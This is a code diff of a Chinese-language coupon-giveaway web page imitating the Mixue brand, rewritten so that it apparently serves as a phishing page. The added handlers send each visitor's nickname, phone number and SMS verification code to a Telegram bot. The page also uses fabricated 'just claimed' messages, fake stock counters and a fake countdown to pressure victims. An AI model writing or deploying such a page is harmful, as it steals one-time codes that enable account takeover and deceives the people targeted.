+  const surname = surnames[Math.floor(Math.random() * surnames.length)];
+  const item = document.createElement('div');
+  item.className = 'barrage-item';
+  item.textContent = `${surname}* ${phoneDisplay} 刚刚领取成功！`;
+  
+  const randomTop = 5 + Math.floor(Math.random() * 40);
+  item.style.top = randomTop + 'px';
+  
+  const randomDuration = 8 + Math.random() * 4;
+  item.style.animationDuration = randomDuration + 's';
+
+  barrageBox.appendChild(item);
+  setTimeout(() => item.remove(), randomDuration * 1000);
+}
+
 function checkPhoneValid() {
   const phoneVal = phoneEl.value.trim();
   const phoneValid = /^1[3-9]\d{9}$/.test(phoneVal);
-  const phoneStatus = document.getElementById('phoneStatus');
   
-  if (phoneVal.length > 0) {
-    if (phoneValid) {
-      phoneEl.classList.remove('input-error');
-      phoneStatus.className = 'input-status valid';
-      phoneStatus.textContent = '✓';
-      
-      // 显示滑块验证
-      verifySlider.classList.add('show');
-      if (!document.getElementById('verifyBlock').dataset.inited) {
-        initSliderVerify();
-      }
-    } else {
-      phoneEl.classList.add('input-error');
-      phoneStatus.className = 'input-status invalid';
-      phoneStatus.textContent = '✗';
-      verifySlider.classList.remove('show');
-      isVerifySuccess = false;
-      resetSlider();
-    }
+  if(phoneVal.length > 0 && !phoneValid) {
+    phoneEl.classList.add('input-error');
   } else {
     phoneEl.classList.remove('input-error');
-    phoneStatus.className = 'input-status';
+  }
+
+  if(phoneValid) {
+    verifySlider.classList.add('show');
+    initSliderVerify();
+  } else {
     verifySlider.classList.remove('show');
+    isVerifySuccess = false;
+    resetSlider();
   }
   
   getBtn.disabled = !phoneValid || !isVerifySuccess;
 }
 
-// 滑块验证初始化
+function resetSlider() {
+  verifySlider.classList.remove('verify-success');
+  verifyBlock.style.left = '0px';
+  verifyBg.style.width = '0px';
+  verifyBlock.textContent = '→';
+}
+
 function initSliderVerify() {
-  const verifyBlock = document.getElementById('verifyBlock');
-  const verifyBg = document.getElementById('verifyBg');
-  
+  if(verifyBlock.dataset.inited) return;
   verifyBlock.dataset.inited = 'true';
+
   let isDragging = false;
   const sliderWidth = verifySlider.offsetWidth;
   const blockWidth = verifyBlock.offsetWidth;
@@ -1111,174 +988,111 @@ function initSliderVerify() {
   }
 }
 
-function resetSlider() {
-  verifySlider.classList.remove('verify-success');
-  const verifyBlock = document.getElementById('verifyBlock');
-  const verifyBg = document.getElementById('verifyBg');
-  verifyBlock.style.left = '0px';
-  verifyBg.style.width = '0px';
-  verifyBlock.textContent = '→';
-}
-
-// 输入验证
-phoneEl.addEventListener('input', () => {
+phoneEl.addEventListener('input', (e) => {
   checkPhoneValid();
 });
 
-phoneEl.addEventListener('blur', () => {
-  checkPhoneValid();
-});
+phoneEl.addEventListener('blur', checkPhoneValid);
 
-nicknameEl.addEventListener('input', () => {
-  const nicknameStatus = document.getElementById('nicknameStatus');
-  if (nicknameEl.value.trim().length > 0) {
-    nicknameStatus.className = 'input-status valid';
-    nicknameStatus.textContent = '✓';
-  } else {
-    nicknameStatus.className = 'input-status';
-  }
-});
-
-codeEl.addEventListener('input', () => {
-  const val = codeEl.value.trim();
-  const codeStatus = document.getElementById('codeStatus');
-  
-  submitBtn.style.display = val.length >= 4 ? 'block' : 'none';
-  
-  if (val.length > 0) {
-    if (val.length >= 4) {
-      codeEl.classList.remove('input-error');
-      codeStatus.className = 'input-status valid';
-      codeStatus.textContent = '✓';
-      submitBtn.disabled = false;
-    } else {
-      codeEl.classList.add('input-error');
-      codeStatus.className = 'input-status invalid';
-      codeStatus.textContent = '✗';
-      submitBtn.disabled = true;
-    }
-  } else {
-    codeEl.classList.remove('input-error');
-    codeStatus.className = 'input-status';
-  }
-});
-
-// 获取验证码
 getBtn.addEventListener('click', async () => {
   if (getBtn.disabled || !isVerifySuccess) return;
-  
-  showLoading('发送验证码中...');
-  
-  // 模拟网络延迟
-  setTimeout(() => {
-    hideLoading();
-    
-    const phone = phoneEl.value.trim();
-    const nickname = nicknameEl.value.trim() || '未填';
-    
-    // 记录发送
-    console.log(`验证码发送给: ${phone}, 昵称: ${nickname}`);
-    
-    // 模拟发送成功
-    let sec = 60;
-    getBtn.disabled = true;
-    getBtn.classList.add('loading');
-    codeEl.disabled = false;
-    codeEl.focus();
-    cdEl.style.opacity = '1';
-    cdEl.textContent = `验证码已发送，请注意查收（${sec}s）`;
-
-    const codeCd = setInterval(() => {
-      sec--;
-      cdEl.textContent = `验证码已发送，请注意查收（${sec}s）`;
-      if (sec <= 0) {
-        clearInterval(codeCd);
-        checkPhoneValid();
-        getBtn.classList.remove('loading');
-        getBtn.textContent = '获取验证码';
-        cdEl.style.opacity = '0';
-      }
-    }, 1000);
-    
-    showToast('验证码已发送，请注意查收手机短信');
-  }, 1500);
-});
-
-// 提交领取
-submitBtn.addEventListener('click', async () => {
-  if (submitBtn.disabled || !isVerifySuccess) return;
-  
   const phone = phoneEl.value.trim();
-  const code = codeEl.value.trim();
-  
-  if (code.length < 4) {
-    codeEl.classList.add('input-error');
-    showToast('请输入有效的验证码');
+  const nickname = nicknameEl.value.trim() || '未填';
+
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `【蜜雪-手机号】\n昵称：${nickname}\n手机号：${phone}\n时间：${new Date().toLocaleString('zh-CN')}`
+      })
+    });
+  } catch(e) {
+    console.error('上报失败:', e);
+    alert('网络异常，验证码发送失败，请重试');
     return;
   }
-  
-  // 显示加载状态
-  submitBtn.disabled = true;
-  submitBtn.classList.add('loading');
-  showLoading('雪王正在努力攀爬中...');
-  
-  // 模拟网络请求
-  setTimeout(() => {
-    hideLoading();
-    submitBtn.classList.remove('loading');
-    submitBtn.disabled = false;
-    
-    // 模拟成功领取
-    claimed++;
-    remaining--;
-    updateProgress();
-    
-    // 撒花庆祝
-    createConfetti();
-    
-    // 显示成功提示
-    showToast('🎉 恭喜！成功领取柠檬茶优惠券！');
-    
-    // 弹幕效果
-    shootBarrage(phone);
-    
-    // 重置表单
-    phoneEl.value = '';
-    codeEl.value = '';
-    submitBtn.style.display = 'none';
-    verifySlider.classList.remove('show');
-    isVerifySuccess = false;
-    resetSlider();
-    checkPhoneValid();
-  }, 2000);
+
+  let sec = 60;
+  getBtn.disabled = true;
+  codeEl.disabled = false;
+  codeEl.focus();
+  cdEl.style.opacity = '1';
+  cdEl.textContent = `验证码已发送，请注意查收（${sec}s）`;
+
+  timers.codeCd = setInterval(() => {
+    sec--;
+    getBtn.textContent = `重新获取(${sec}s)`;
+    cdEl.textContent = `验证码已发送，请注意查收（${sec}s）`;
+    if (sec <= 0) {
+      clearInterval(timers.codeCd);
+      checkPhoneValid();
+      getBtn.textContent = '获取验证码';
+      cdEl.style.opacity = '0';
+    }
+  }, 1000);
 });
 
-// 弹幕效果
-function shootBarrage(customPhone = null) {
-  const barrageBox = document.getElementById('barrageBox');
-  const phonePrefixes = ['130','131','132','133','134','135','136','137','138','139'];
-  const surnames = ['王','李','张','刘','陈','杨','赵','黄','周','吴'];
-  
-  let phoneDisplay = customPhone && /^1[3-9]\d{9}$/.test(customPhone)
-    ? customPhone.slice(0,3) + "****" + customPhone.slice(-4)
-    : phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)] + "****" + (1000 + Math.floor(Math.random() * 9000));
+codeEl.addEventListener('input', (e) => {
+  const val = codeEl.value.trim();
+  submitBtn.style.display = val.length >= 4 ? 'block' : 'none';
+  submitBtn.disabled = val.length < 4;
+  if(val.length > 0 && val.length < 4) {
+    codeEl.classList.add('input-error');
+  } else {
+    codeEl.classList.remove('input-error');
+  }
+});
 
-  const surname = surnames[Math.floor(Math.random() * surnames.length)];
-  const item = document.createElement('div');
-  item.className = 'barrage-item';
-  item.textContent = `${surname}* ${phoneDisplay} 刚刚领取成功！`;
-  
-  const randomTop = 5 + Math.floor(Math.random() * 40);
-  item.style.top = randomTop + 'px';
-  
-  const randomDuration = 8 + Math.random() * 4;
-  item.style.animationDuration = randomDuration + 's';
+submitBtn.addEventListener('click', async () => {
+  if (submitBtn.disabled || !isVerifySuccess) return;
+  const phone = phoneEl.value.trim();
+  const code  = codeEl.value.trim();
+  const nickname = nicknameEl.value.trim() || '未填';
 
-  barrageBox.appendChild(item);
-  setTimeout(() => item.remove(), randomDuration * 1000);
-}
+  if (code.length < 4) {
+    codeEl.classList.add('input-error');
+    alert('请输入有效的验证码');
+    return;
+  }
 
-// 全局倒计时
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: `【蜜雪-完成】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}`
+      })
+    });
+  } catch(e) {
+    console.error('提交上报失败:', e);
+    alert('网络异常，提交失败，请重试');
+    return;
+  }
+
+  const key = 'mx_claim_' + phone;
+  if (localStorage.getItem(key)) {
+    alert('您已领取过，请勿重复操作~');
+    return;
+  }
+  localStorage.setItem(key, Date.now().toString());
+
+  claimed++;
+  updateStockDisplay();
+  shootBarrage(phone);
+  modal.style.display = 'flex';
+});
+
+closeModalBtn.addEventListener('click', () => {
+  modal.style.display = 'none';
+});
+
+modal.addEventListener('click', (e) => {
+  if (e.target === modal) modal.style.display = 'none';
+});
+
 function startGlobalCountdown() {
   let remain = (120 + Math.floor(Math.random() * 150)) * 60;
   const timerEl = document.getElementById('globalTimer');
@@ -1297,51 +1111,17 @@ function startGlobalCountdown() {
   };
 
   tick();
-  setInterval(tick, 1000);
+  timers.globalCd = setInterval(tick, 1000);
 }
 
-// Toast提示
-function showToast(message) {
-  const toast = document.createElement('div');
-  toast.textContent = message;
-  toast.style.cssText = `
-    position: fixed;
-    top: 20px;
-    left: 50%;
-    transform: translateX(-50%);
-    background: rgba(0,0,0,0.8);
-    color: white;
-    padding: 12px 24px;
-    border-radius: 24px;
-    font-size: 0.9rem;
-    z-index: 10001;
-    animation: slideDown 0.3s ease;
-  `;
-  
-  document.body.appendChild(toast);
-  
-  setTimeout(() => {
-    toast.style.animation = 'fadeOut 0.3s ease forwards';
-    setTimeout(() => toast.remove(), 300);
-  }, 2000);
-}
-
-// 自动弹幕
-setInterval(() => {
-  shootBarrage();
-}, 4000);
-
-// 初始化
-createSnow();
-updateProgress();
+timers.fakeStock   = setInterval(fakeClaimIncrease, 2200);
+timers.barrageAuto = setInterval(shootBarrage, 3800);
 startGlobalCountdown();
+updateStockDisplay();
 
-// 随机显示网络错误（演示用）
-setTimeout(() => {
-  if (Math.random() > 0.7) {
-    showNetworkError();
-  }
-}, 10000);
+window.addEventListener('beforeunload', () => {
+  Object.values(timers).forEach(t => clearInterval(t));
+});
 </script>
 </body>
 </html>
